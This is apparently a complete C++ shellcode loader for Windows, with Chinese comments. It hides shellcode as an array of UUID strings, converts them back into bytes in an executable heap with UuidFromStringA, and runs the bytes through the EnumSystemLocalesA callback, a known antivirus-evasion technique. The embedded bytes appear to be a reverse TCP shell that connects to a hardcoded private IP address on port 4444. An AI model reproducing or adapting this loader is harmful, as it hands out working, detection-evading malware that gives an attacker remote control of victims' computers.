#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")
using namespace std;

//用于存放shellcode转的uuid的数组
const char* uuids[] = { "008fe8fc-0000-3160-d264-8b523089e58b","528b0c52-8b14-2872-0fb7-4a2631ff31c0","7c613cac-2c02-c120-cf0d-01c74975ef52","10528b57-428b-013c-d08b-407885c0744c","8b50d001-2058-488b-1801-d385c9743c31","348b49ff-018b-31d6-c0c1-cf0dac01c738","03f475e0-f87d-7d3b-2475-e0588b582401","0c8b66d3-8b4b-1c58-01d3-8b048b01d089","5b242444-615b-5a59-51ff-e0585f5a8b12","ffff80e9-5dff-3368-3200-00687773325f","774c6854-0726-e889-ffd0-b89001000029","685054c4-8029-006b-ffd5-6a0a68c0a82f","0002689b-5c11-e689-5050-505040504050","df0fea68-ffe0-97d5-6a10-56576899a574","85d5ff61-74c0-ff0a-4e08-75ece8670000","6a006a00-5604-6857-02d9-c85fffd583f8","8b367e00-6a36-6840-0010-0000566a0068","e553a458-d5ff-5393-6a00-5653576802d9","d5ff5fc8-f883-7d00-2858-68004000006a","0b685000-0f2f-ff30-d557-68756e4d61ff","ff5e5ed5-240c-850f-70ff-ffffe99bffff","29c301ff-75c6-c3c1-bbf0-b5a2566a0053","9090d5ff-9090-9090-9090-909090909090" };


int UuidLoader() {

    // 创建一个具有执行权限的堆
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

    // 在堆上分配一块可执行内存
    void* buffer = HeapAlloc(hc, 0, 0x100000);

    // 检查内存分配是否成功，如果失败则输出错误信息并返回0
    if (buffer == NULL) {
        cout << "内存申请失败！" << endl;
        return 0;
    }


    PBYTE buffer_backup = (PBYTE)buffer;  //定义一个存储uuid转换成的二进制字节序列(shellcode)
    int elems = sizeof(uuids) / sizeof(uuids[0]);  //获取uuid数组元素的个数

    /*
    UuidFromStringA函数将UUID值转换成二进制字节序列,其语法格式如下:
    RPC_STATUS UuidFromStringA(
        RPC_CSTR StringUuid,  //指向uuid形式的字符串的指针
        UUID * Uuid  //用于接收二进制字节序列的指针
    );
    */
    // 遍历uuids数组,并将UUID转换回原始的shellcode,然后存储在buffer_backup地址
    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)buffer_backup);
        if (status != RPC_S_OK) {
            cout << "UuidFromStringA() != S_OK" << endl;
            CloseHandle(buffer);
            return -1;
        }
        buffer_backup += 16;
    }

    /*
   EnumSystemLocalesA函数用于枚举系统中支持的所有区域设置,其语法格式如下:
   BOOL EnumSystemLocalesA(
     LOCALE_ENUMPROCA lpLocaleEnumProc,  //处理每个枚举到的区域设置信息的回调函数的地址
     DWORD            dwFlags  //指定枚举的方式
   );
   */
   // 使用 EnumSystemLocalesA 函数调用转换回的 shellcode
    EnumSystemLocalesA((LOCALE_ENUMPROCA)buffer, 0);

    // 关闭内存句柄
    CloseHandle(buffer);
}

void main() {

    // 调用 UuidLoader 函数
    UuidLoader();
}